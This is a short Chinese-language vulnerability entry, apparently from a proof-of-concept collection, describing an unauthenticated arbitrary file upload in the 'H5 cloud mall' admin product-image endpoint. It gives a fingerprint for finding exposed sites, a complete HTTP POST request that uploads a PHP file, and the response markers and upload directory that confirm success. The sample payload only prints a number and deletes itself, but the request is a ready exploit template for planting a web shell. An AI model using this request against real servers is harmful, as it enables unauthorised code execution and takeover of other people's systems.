﻿# H5云商城-任意文件上传-file

> 更新时间：2024-05-14

> 漏洞编号：

> 漏洞说明：由于H5 云商城 /admin/commodtiy/ 接口商品图片上传处，没有对用户传入的文件进行校验和过滤判断，导致未经身份验证的远程攻击者可直接上传恶意后门文件，执行恶意代码，获取服务器权限。

> 漏洞特征：body="/public/qbsp.php"

> 验证脚本：HTTP

```
POST /admin/commodtiy/file.php?upload=1 HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFQqYtrIWb8iBxUCx
 
------WebKitFormBoundaryFQqYtrIWb8iBxUCx
Content-Disposition: form-data; name="file"; filename="dudesite.php"
Content-Type: application/octet-stream
 
<?php echo 111*111;unlink(__FILE__)?>
------WebKitFormBoundaryFQqYtrIWb8iBxUCx--
```

> 响应代码特征：200

> 响应内容特征：upload

> 上传文件定位：/admin/commodtiy/upload/

> 验证文件来源：H5云商城-任意文件上传-file.poc

